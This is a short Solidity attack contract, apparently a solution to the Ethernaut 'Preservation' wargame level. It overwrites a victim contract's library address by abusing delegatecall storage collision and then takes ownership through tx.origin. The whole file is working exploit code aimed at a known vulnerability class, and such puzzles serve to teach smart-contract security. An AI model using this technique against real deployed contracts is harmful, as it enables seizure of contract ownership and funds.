// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Preservation {
  function setFirstTime(uint time) external;
}

contract Graffiti {
  address public _a;
  address public _b;
  address public owner;

  function changeLibraryAddress(address target) public {
    Preservation(target).setFirstTime(uint(uint160(address(this))));
  }

  function changeContractOwner(address target) public {
    Preservation(target).setFirstTime(block.timestamp);
  }

  function setTime(uint time) public {
    owner = tx.origin;
  }
}
